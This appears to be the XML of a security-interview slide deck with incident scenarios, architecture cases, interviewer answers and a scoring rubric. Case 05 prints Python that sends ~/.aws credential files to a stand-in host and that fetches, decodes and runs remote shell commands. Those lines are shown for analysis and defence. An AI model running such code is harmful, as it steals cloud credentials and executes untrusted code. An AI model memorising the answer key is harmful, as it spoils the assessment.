            <a:ext cx="509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sync_url = https://support-sync.example/api/diag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E20B1-6766-4A38-86EA-88D2AE8E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50482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from pathlib import Path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import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root = Path.home() / '.aws'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items = {p.name: p.read_text()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     for p in root.glob('*')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     if p.is_file()}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requests.post(sync_url, json=items,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          timeout=5)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5B32-790D-49ED-9B3E-5E42B821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B  /  apply.py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4EAF8-3B5C-42BA-806B-5BDD5245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14525"/>
            <a:ext cx="521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feed_url = https://updates-helpdesk.example/manifest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6AED6-19E6-4CF6-A3D8-66517BD5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5191125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import base64, subprocess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import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manifest = requests.get(feed_url,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                    timeout=5).json()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blob = base64.b64decode(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   manifest['post_check'])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subprocess.run(blob.decode(),</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr>
              <a:defRPr sz="1350" b="0">
                <a:solidFill>
                  <a:srgbClr val="16212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212B"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>               shell=True, check=False)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ACC86-8122-4D29-80FF-93117314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292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168E3-E0FE-4464-AA4D-ACEEBF93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1  What can each excerpt do, and what evidence would prove it ran or moved secrets?</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr>
              <a:defRPr sz="14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2  How would you detect related activity, contain exposure, and change the risky design?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8455742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/>
          <p:cNvCxnSpPr>
            <a:stCxn xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" id="19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10077450" y="3267075"/>
            <a:ext cx="4763" cy="914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439025" y="2662238"/>
            <a:ext cx="1285875" cy="47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829175" y="2667000"/>
            <a:ext cx="752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24100" y="2667000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63875B-E218-4270-A50F-3A9282DC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Architecture A  /  customer data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AD250-4DCC-47A3-BF10-9D3604AC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Current design  ·  VPC 10.10.0.0/16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BF2E5-4130-4724-98F8-76A68E1E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04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EXTERNAL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3E975-EA73-4E38-9969-43EBD3D8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704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PUBLIC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96C93-F81F-4400-A5E2-E129467D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04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DCF26-46A8-4715-A9EF-6DE672EB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704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9BAA1-CA76-49B4-ACC4-56C18104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1619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C7D71-C613-4B4B-996C-31E2ED98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76475"/>
            <a:ext cx="137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Internet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CD6CC-C7E7-4358-9D85-D42F2D6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38425"/>
            <a:ext cx="1371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Untrusted clients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291AD-3B2F-4BBA-A6BA-91008324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52650"/>
            <a:ext cx="1714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DD237-5E24-4420-9752-D16565F3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76475"/>
            <a:ext cx="1466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Public ALB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1CBF1-2279-4E9E-8F0A-DF9D2F5C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38425"/>
            <a:ext cx="146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HTTPS 443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13E97B-E0B8-4377-91DA-A489A438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52650"/>
            <a:ext cx="1857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1C708-B64A-4B08-8741-9D785529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276475"/>
            <a:ext cx="1609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Web /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A5D9A-7C35-4432-9DAE-7F1E8B74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638425"/>
            <a:ext cx="16097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sg-app  ·  TCP 8443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A3947-D1CC-4B3C-B424-16410D79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57400"/>
            <a:ext cx="2714625" cy="1209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1817B-8A2C-4579-8E5F-C05FB2D0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181225"/>
            <a:ext cx="24669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30814-D199-4811-85F6-1B3C13F3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43175"/>
            <a:ext cx="2466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sg-db: TCP 5432</a:t>
            </a:r>
          </a:p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from 10.10.0.0/16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4D403-9DA8-49DB-A1BA-01118CA9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181475"/>
            <a:ext cx="20383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35717-DEAF-44BD-8E68-51704D83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05300"/>
            <a:ext cx="179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Corporate VPN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CF8A34-5EC5-4A9B-82E2-CC8736EF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67250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10.10.3.0/24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D51C6F-EE56-4838-93A5-9A798599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670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443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50B38-9D46-4DB8-85F4-274C773A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86702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8443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4B3A1B-01EB-4F1E-98DD-A3BC19CD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67025"/>
            <a:ext cx="552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5432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0B9AAD-7417-4B78-8316-7DE06425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4807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5432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9F29BE-4DA5-4B6B-BA30-DEF005D2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Where is the weak trust boundary? How would you detect abuse, contain it, and redesign it?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12623813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53325" y="3300413"/>
            <a:ext cx="1362075" cy="1047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7553325" y="2376488"/>
            <a:ext cx="1362075" cy="923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76800" y="3300413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38400" y="3300413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D7F86"/>
            </a:solidFill>
            <a:prstDash val="solid"/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3405FA-7EEF-4A17-B06D-6A1C946D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Architecture B  /  production administration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56A07-35B7-4ABA-9CE2-3ECF390C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Current design  ·  direct access to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2C0FF-ECA9-4264-91AF-B453F920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17526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47049-E080-4566-B1FC-328DBF47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14650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Laptop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6A0A6-5E6E-4959-B7AD-3438B0F2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766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Contractor / unmanaged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81962-FB71-4DEF-88E8-E5CEDF68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90825"/>
            <a:ext cx="17526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A3B3D-71C0-421D-9C2A-6894C864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914650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VPN gateway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0C6BE-7AD8-4BE2-9C87-3F7FD564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766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Password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9617F-9D6D-4BAE-BC0F-E4A27456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90825"/>
            <a:ext cx="198120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AFA56-E39A-4470-B1BA-067C554F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Admin subnet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DEB1A-B89E-4CC9-B02C-C38384B8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7660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Shared admin account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2D4BA-2116-4155-B476-E2EE8EAA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76425"/>
            <a:ext cx="2419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21849-AB2F-4148-82FF-48AF5B6B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00250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Production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98BE7-820D-4881-B64B-5C881F87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3622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SSH / WinRM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1C4E0-FE04-418C-9909-CEA34B6E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48100"/>
            <a:ext cx="24193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B"/>
          </a:solidFill>
          <a:ln xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" w="19050">
            <a:solidFill>
              <a:srgbClr val="6D7F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643E8-1ED8-4070-8743-447AAFA2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971925"/>
            <a:ext cx="2171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Production DB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A5E34-0477-4466-A30A-FA77D311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333875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TCP 5432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1A2BF-6432-4239-807E-24D08A9E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SIEM feed: VPN sign-ins only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92B33-1910-4321-817A-E229558E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Which access and audit gaps matter most? How would you detect, mitigate, and prevent abuse?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14017114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3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5DA0C-E3EE-4181-BC31-6D5B730C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8F7F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8F7F2"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>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00951-2F5D-4286-ACC3-B7EBBF6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FD7D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FD7D8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Stop sharing before continuing.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16963883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0B7D6-2C8E-41C7-A37D-7EC1D82C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In-person interview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56265-F412-4E22-934B-EA00034E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Use any four scenarios for a 45-minute interview, or all seven for a longer session.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E6A7C-2D78-4420-A7A2-C73DEA86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Show the candidate deck one slide at a time. Ask them to state observations before conclusions, name missing telemetry, and explain the tradeoff in each proposed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7E31B-E173-4D52-9633-FC9F19CA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03: probe safe sample analysis. Case 05: ask what the code proves versus what needs execution telemetry. Architecture cases: identify the trust boundary before proposing a tool.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10693071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66D35-4A1F-41A2-AC60-1DB0DE88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Scoring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3F90C-4AE7-47AE-B0A7-5B45193D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90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Score each area 0-2 per scenario. Maximum 10 per scenario.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E295D-7ADE-46B1-AE3B-A55AB98B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57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Diagnosis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18F83-0268-430D-928B-E652C6D5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5737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Reconstructs the sequence or identifies the weak trust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835E5-10FC-4F37-AB9D-31979F14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84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Judgment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3DFBE-BF27-44C5-82A7-4C839959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3842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Separates observations from hypotheses and asks for decisive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4E23A-5202-4624-BF0D-44735A17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ACE7E-D505-428A-BEDC-42120BB5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1947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Names useful telemetry, correlation keys, and likely false positives.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142DB-2BF1-4130-9E91-2061DB2B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005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60033-4183-4A93-AEBF-A0047FC1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0052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Prioritizes containment while preserving evidence and continuity.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EEBF5-B374-4067-8ADE-B9845DE5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F0FE2-3B36-41E8-9C81-CC5278A9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8157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Proposes a durable control and explains its operational tradeoff.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ABFB2-79EB-48CB-859B-2691E8FB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871"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>0 = missing or wrong     1 = partial     2 = precise and defensible</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5922818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51AA5-2185-4FBD-8B4E-FAD1741B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01  /  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6EB6C-F002-4415-942B-3C133A8D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90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D9E7F-993A-4A35-969B-3EFC782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71575"/>
            <a:ext cx="881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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Likely document-triggered PowerShell loader. WINWORD launches hidden PowerShell, whose script downloads and executes s.exe. The excerpt does not show the payload's behavior or prove a macro was used.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5F6E2-DE73-46A5-8FFD-63F2F464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0290A-8CEC-4C44-8A29-43AD3409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881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Join WINWORD-to-PowerShell process creation with 4104 download-and-execute content, network activity, and the downloaded file hash. Hunt across endpoints; tune for approved Office automation.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2F20D-5867-49D1-A47D-7FCF9A85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00BC4-142A-471D-AF91-06F709C6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38575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Isolate LT-184, preserve the document and payload, stop the process, and scope other hosts that ran the hash or contacted the domain.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576E2-9D79-45A0-8452-3C91EDA2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9BB4B-60AC-46D1-A099-A7345F54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76825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Use the Office child-process ASR rule where compatible, application control for user-writable paths, and script block logging with alerting.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9542006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DEAA5-B4A9-41CF-912A-EA255464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02  /  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55BFB-D65A-436D-A112-286982C4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90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A7B53-DDEE-4EF3-8857-F5F4D09C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71575"/>
            <a:ext cx="881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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>A PowerShell remoting session from WS-107 creates logon persistence on FS-02. This could be approved administration; the task binary, source workstation, and change record determine intent.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98097-8891-4EE3-BB3F-EF79803E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904C5-59AD-4661-BD5D-FAC9CC8E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881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Correlate source PowerShell/4104 and WinRM traffic with target 4624, target 4104, and TaskScheduler/106. Baseline approved admin sources and task names rather than flagging all remoting.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7415C-FD4A-47B6-96B9-68FAA359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98C5B-F417-47D9-8D15-9A61EC60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38575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If unauthorized, disable the task after preserving evidence, isolate WS-107, inspect FS-02, and rotate svc_patch credentials.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8C5AB-9953-4D78-9380-6C68D219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73036-7FEB-42C1-A9BF-0CC50A7B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76825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Limit remoting to managed admin hosts, reduce svc_patch privileges, and use constrained endpoints such as JEA for routine tasks.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15913931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0B890-2BAB-4B15-BD53-142961F3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03  /  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CFA98-7982-4A6C-A2E9-F1488FD8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90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B87F1-E337-4324-B4D0-68D7F701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71575"/>
            <a:ext cx="881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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Likely browser credential theft with persistence and outbound transfer. Static imports and strings are clues; the sandbox read, Run-key write, and POST provide behavioral support. Confirm what data was sent.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0C625-7B54-492E-8776-8371956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CAEB6-1BCB-45CC-AE4F-73E118B2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881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Hunt for the hash and for non-browser processes reading Login Data, setting Run keys, and sending outbound POSTs. Analyze the sample in an isolated instrumented environment.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7E4CA-AA9D-4A29-9E92-226B1ADC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70BA9-3190-4C3F-B9E2-82DE0D7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38575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Isolate hosts that ran the sample, quarantine copies, remove persistence after evidence capture, and treat stored browser credentials as exposed.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2F48B-70F7-451F-ADA6-75804DC9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B34B1-922A-45EB-82A0-F3AE2803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76825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Restrict executables from download paths, verify software provenance, reduce browser-stored secrets, and require phishing-resistant MFA for high-value accounts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15175407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5B709-5454-43BA-A464-7C97647A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04  /  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B3544-2506-42D2-ACBC-D89E870D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90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ACCA6-856B-4548-9DCC-4D2767BC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71575"/>
            <a:ext cx="881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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>The CI role creates an access key for breakglass-admin and then stops org-audit logging. This is high-risk activity; confirm the trail state and whether the change was authorized.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EE297-6682-480D-88F7-BB389126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289E7-E976-4F96-A3A9-CE4682D1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881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Alert on key creation for privileged users and StopLogging, especially in one role session. Correlate actor, source IP, account, region, and change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65AEA-115D-4F3B-B5CD-E57F0FAA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0E9A9-EE12-435B-826D-0B2898F3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38575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Restore logging, disable the new key, revoke the role session if unauthorized, and trace key use across regions and accounts.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CF805-A341-4B8C-B831-D1BDCFA2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25907-7B08-40B3-BE07-36878C4D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76825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Remove key-management and logging-control rights from CI roles. Apply preventive policy to protect audit trails and monitor them from an independent account.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7608528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9635D-F7DF-4C39-8AD6-A47BDC80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Case 05  /  Python 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681BD-A8B4-4D5C-9646-7EF82F2C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90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E09F4-4818-4BF8-91BB-B59EE73C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71575"/>
            <a:ext cx="8810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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>A reads files under ~/.aws and prepares a JSON POST. B decodes a field from a fetched manifest and runs it through a shell. The excerpts show capability, but provide no proof of execution or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4F23B-2353-4CF8-A64C-BC4B58EF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43BB2-0BC6-4184-839C-ADB40B3C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881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Seek Python process and child-process events, file access under ~/.aws, DNS or HTTP to the two domains, and the fetched manifest body. Correlate timestamps and hosts. Do not assume the URL strings alone prove exfiltration.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FB00A-14B6-4215-A4A5-8A3AD6C7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57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3AB81-BCBB-45ED-B2C8-643F3D8C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38575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If execution is confirmed, preserve scripts and responses, isolate affected hosts, scope access, and revoke cloud credentials if their contents may have left the host. Disable the remote command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FB1D2-DC9B-4476-89D1-A28CC166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A6667-7B35-4E88-8050-8C48C17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76825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Exclude secrets from diagnostics and restrict outbound destinations. Replace remote shell execution with signed, reviewed actions and an explicit allowlist. Run the package with minimal privileges.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="810219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EA4DC-745B-4FC1-A647-B2C23F48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Architecture A  /  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BCDE9-74FB-451B-8509-8B93540C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Core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1D36E-1165-42DA-AC1D-D4F540E6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90625"/>
            <a:ext cx="881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44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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>The database security group allows TCP 5432 from the entire VPC. Any compromised workload or VPN client in that range may reach the DB. The missing boundary is a narrow DB firewall or security-group rule.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63862-C80C-43E3-BCD1-FB64106C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23B18-6C3D-4B6B-BA11-9B4D86C1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0325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Query VPC Flow Logs for accepted 5432 connections to the DB from sources other than approved app hosts. Pair with DB login failures, unusual queries, and changes to sg-db.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CE60F-B3AD-469A-81C0-5ADED471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71577-D9A2-4A5E-A866-AFCF08DD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Review legitimate DB clients, then restrict sg-db to the app security group and an approved admin path. Inspect recent DB access before closing sessions or rotating credentials.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53299-1A2B-4145-BA09-06DC5C04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0210B-988C-41EE-A701-A7D9EA58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43500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Manage SG rules through reviewed infrastructure code, enforce least-privilege policy checks, and use just-in-time admin access. Account for break-glass maintenance.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6613128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CD540-4B3A-474C-AE86-E339EC7F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2B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Architecture B  /  interviewer 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8E189-BA12-4CED-98EA-7317ED4E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96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Core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61922-EC30-4638-90FA-E1611530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90625"/>
            <a:ext cx="881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4443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4435"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Password-only VPN access from an unmanaged laptop reaches a flat admin network using a shared account. Admin actions cannot be reliably attributed with VPN logs alone.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302AE-E2D7-44AA-A812-6C6D57FF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52D59-FB3F-4CE5-B502-2DB2A0B1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0325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Join VPN sign-ins with privileged account use, production host events, DB audit logs, and session records. Look for unusual devices, hours, targets, and access beyond approved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3471E-D3B2-4835-ADE0-F39AA849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FB8E4-8E9C-4A17-BDAA-7101A613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Require MFA, restrict VPN routes to necessary admin targets, disable or rotate the shared credential, and verify any active sessions and production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79B3C-28E1-4B43-9852-442F296C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D687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6871"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Prevention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9B555-64E7-404E-9029-7B49C938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43500"/>
            <a:ext cx="8810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6212B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Use managed admin devices, per-person privileged accounts, JIT/PAM through a controlled access path, and central command or session logging. Plan a break-glass route.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="98852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2026-09-29T12:51:32.9470000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-29T12:51:32.9470000Z</dcterms:modified>
</coreProperties>
</file>